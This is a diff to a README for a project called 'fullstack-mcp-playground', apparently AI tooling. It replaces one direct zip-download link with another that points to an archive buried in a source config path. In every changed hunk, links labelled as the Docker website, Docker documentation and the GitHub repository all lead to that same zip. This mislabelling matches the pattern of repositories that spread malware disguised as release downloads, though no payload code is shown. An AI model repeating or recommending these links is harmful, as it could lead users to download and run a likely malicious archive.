@@ -1,6 +1,6 @@
 # 🥷 fullstack-mcp-playground - Power Your AI Projects Easily
 
-![Download](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
+![Download](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
 
 ## 📦 Overview
 
@@ -13,13 +13,13 @@ To start using the **fullstack-mcp-playground**, follow these simple steps. You'
 1. **Download the Application**  
    Visit the Releases page to download the software.  
 
-   [Download Here](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
+   [Download Here](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
 
 2. **Extract the Files**  
    After downloading, unzip the downloaded file to a folder on your computer.  
 
 3. **Install Docker**  
-   If you don’t have Docker yet, download it from the [Docker website](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip). This project uses Docker to run its services.
+   If you don’t have Docker yet, download it from the [Docker website](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip). This project uses Docker to run its services.
 
 4. **Launch the Application**  
    Open a terminal or command prompt. Navigate to the folder where you extracted the files. Run the following command:
@@ -37,7 +37,7 @@ To start using the **fullstack-mcp-playground**, follow these simple steps. You'
 
 To get the latest version of **fullstack-mcp-playground**, head over to the Releases page:
 
-[Download Here](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
+[Download Here](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
 
 ## 🛠️ Features
 
@@ -101,8 +101,8 @@ We are actively working on adding more features to enhance the playground. Some 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
+- [GitHub Repository](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
+- [Docker Documentation](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
 
 ## 💬 Support
 
@@ -110,4 +110,4 @@ If you have any questions or face any issues, feel free to create an issue in th
 
 Remember, you can always visit the Releases page to stay updated with the latest versions!
 
-[Download Here](https://raw.githubusercontent.com/Sanga1032/fullstack-mcp-playground/main/Euskaldun/fullstack-mcp-playground.zip)
+[Download Here](https://github.com/Sanga1032/fullstack-mcp-playground/raw/refs/heads/main/repositories/mcp-template/src/config/playground_fullstack_mcp_v3.1.zip)
